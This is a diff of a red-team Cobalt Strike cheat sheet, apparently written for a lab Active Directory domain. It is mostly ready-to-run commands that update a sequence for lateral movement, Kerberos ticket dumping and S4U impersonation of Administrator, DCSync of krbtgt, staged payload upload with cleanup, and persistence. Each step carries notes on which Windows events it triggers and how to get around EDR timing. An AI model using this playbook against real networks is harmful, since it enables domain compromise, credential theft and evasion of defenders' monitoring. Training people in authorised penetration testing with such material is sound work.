@@ -508,32 +508,56 @@ MATCH p=shortestPath((u:User)-[*1..]->(c:Computer{name:"LON-DC-1.CONTOSO.COM"}))
 Use highest-OPSEC method that works. Impersonate before moving.
 
 ```cs
-// Test WinRM reachability first
-beacon> powerpick Test-WSMan lon-ws-1
+// ALWAYS impersonate with steal_token first — not make_token alone
+// make_token without kerberos_ticket_use = fake creds = ERROR_LOGON_FAILURE on WinRM (lab-confirmed)
+beacon> ps                               // find target user process
+beacon> steal_token <pid>               // OPSEC-🟢SAFE — preferred auth method for all jump commands
 
-// Option 1 — WinRM (OPSEC-🟢SAFE — preferred)
-beacon> make_token CONTOSO\rsteel Passw0rd!
-beacon> jump winrm64 lon-ws-1 smb
+// Test WinRM reachability
+beacon> powerpick Test-WSMan <target>
 
-// Option 2 — SCShell (OPSEC-🟠CAUTION — no Event 7045, modifies existing service)
+// Option 1 — WinRM (OPSEC-🟢SAFE — preferred, no service, no Event 7045/7040)
+beacon> spawnto x64 %windir%\sysnative\werfault.exe
+beacon> jump winrm64 <target> smb_custom
+// If ERROR_FILE_NOT_FOUND → wait 10-15s → retry ONCE (EDR scan timing gap)
+// If fails twice → fall to Option 2
+// ⚠️ winrm64 lands as the steal_token user (NOT SYSTEM) — run getsystem if SYSTEM needed
+
+// Option 2 — SCShell (OPSEC-🟠CAUTION — Event 7040 x2, transient disk write, lands as SYSTEM)
 // CS > Script Manager > Load > C:\Tools\SCShell\CS-BOF\scshell.cna
 beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
-beacon> make_token CONTOSO\rsteel Passw0rd!
-beacon> jump scshell64 lon-ws-1 smb
+beacon> jump scshell64 <target> smb_custom
+// scshell64 lands as SYSTEM directly — no getsystem needed
 
-// Option 3 — WMI (OPSEC-🟠CAUTION — no service, no 7045)
-beacon> make_token CONTOSO\rsteel Passw0rd!
-beacon> remote-exec wmi lon-ws-1 C:\Windows\Temp\update.exe
+// Option 3 — Pre-staged payload via WinRM (EDR environments — use custom-built payload)
+beacon> cd \\<target>\c$\Windows\Temp
+beacon> upload C:\Payloads\smb_x64.exe
+beacon> remote-exec winrm <target> C:\Windows\Temp\smb_x64.exe
+beacon> rm \\<target>\c$\Windows\Temp\smb_x64.exe   // cleanup after beacon checks in
 
-// Option 4 — psexec (OPSEC-🔴UNSAFE — LAST RESORT — generates Event 7045)
+// Option 4 — WMI (OPSEC-🟠CAUTION — no service, Event 4688)
+beacon> remote-exec wmi <target> C:\Windows\Temp\smb_x64.exe
+
+// Option 5 — psexec (OPSEC-🔴UNSAFE — LAST RESORT — Event 7045)
 beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
-beacon> make_token CONTOSO\rsteel Passw0rd!
-beacon> jump psexec64 lon-ws-1 smb
+beacon> jump psexec64 <target> smb_custom
 
 beacon> rev2self     // drop impersonation after lateral move succeeds
 ```
 
-**Decision flow:** `winrm64` → `scshell64` → `remote-exec wmi` → `psexec64` (last resort only).
+**Decision flow:**
+```
+steal_token → winrm64 (retry once on ERROR_FILE_NOT_FOUND)
+  → scshell64 → remote-exec winrm + staged payload → remote-exec wmi → psexec64 (🔴 last resort)
+```
+
+**After winrm64 — check if SYSTEM is needed:**
+```cs
+beacon> getuid
+// If returns domain user (not SYSTEM) and SYSTEM is required (e.g. krb_dump machine TGT):
+beacon> getsystem    // OPSEC-🟠CAUTION — named pipe impersonation, works from admin context
+// steal_token <SYSTEM-pid> fails from winrm64 wsmprovhost.exe context — use getsystem instead
+```
 
 ---
 
@@ -593,15 +617,21 @@ beacon> krb_dump /luid:<LUID> /service:krbtgt   // dump DA TGT
 // Enumerate hosts with msDS-AllowedToDelegateTo set
 beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
 
-// Move to constrained delegation host (lon-ws-1), dump machine TGT
-beacon> krb_triage
-beacon> krb_dump /luid:3e7 /service:krbtgt     // 3e7 = SYSTEM LUID
+// Move to constrained delegation host (lon-ws-1) as SYSTEM — dump machine TGT
+beacon> krb_triage                              // check for cached DA TGTs first — may skip S4U entirely
+beacon> krb_dump /luid:3e7 /service:krbtgt      // ⚠️ NO 0x prefix — /luid:0x3e7 = "Invalid luid" error
 
 // S4U abuse — get service ticket impersonating Administrator
 beacon> krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
-beacon> make_token CONTOSO\Administrator FakePass
+// Save kirbi on attacker desktop PowerShell:
+// [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[B64]"))
+
+// make_token is OPTIONAL when beacon is SYSTEM (lab-confirmed 2026-04-19)
+// kerberos_ticket_use injects into SYSTEM session — remote server sees Administrator auth regardless
 beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
 beacon> ls \\lon-fs-1\c$
+beacon> rev2self
+beacon> kerberos_ticket_purge
 ```
 
 ### RBCD (Resource-Based Constrained Delegation)
@@ -808,7 +838,10 @@ CREDENTIAL HARVEST:
   Token:        steal_token <pid>
 
 LATERAL (preference order):
-  jump winrm64 <target> smb  →  jump scshell64 <target> smb  →  remote-exec wmi  →  jump psexec64 (last resort)
+  steal_token <pid>  →  jump winrm64 <target> smb_custom  (retry once on ERROR_FILE_NOT_FOUND)
+    → jump scshell64 <target> smb_custom  →  remote-exec winrm + staged payload  →  jump psexec64 🔴
+  ⚠️ make_token alone = ERROR_LOGON_FAILURE on WinRM — use steal_token for auth
+  ⚠️ winrm64 lands as user not SYSTEM — run getsystem if SYSTEM needed (steal_token fails from wsmprovhost)
 
 DCSYNC (OPSEC-🟠CAUTION — logged on DC):
   beacon> dcsync CONTOSO\krbtgt
@@ -821,7 +854,10 @@ PERSISTENCE:
   SYSTEM-level: WMI subscription → DNS beacon on gpupdate (Phase 6)
 
 INJECT TGT:
-  make_token DOMAIN\user FakePass  →  kerberos_ticket_use <path>.kirbi  →  rev2self
+  steal_token <pid>  →  kerberos_ticket_use <path>.kirbi  →  rev2self        // preferred (🟢SAFE)
+  make_token DOMAIN\user FakePass  →  kerberos_ticket_use <path>.kirbi  →  rev2self  // fallback (🟠CAUTION Event 4648)
+  ⚠️ make_token optional when beacon is SYSTEM — kerberos_ticket_use injects into SYSTEM session directly
+  ⚠️ krb_dump luid: use /luid:3e7 NOT /luid:0x3e7 — Kerbeus-BOF rejects 0x prefix ("Invalid luid")
 
 CLEANUP:
   rev2self | rm <kirbi-files> | sql-disableclr | sql-disablerpc
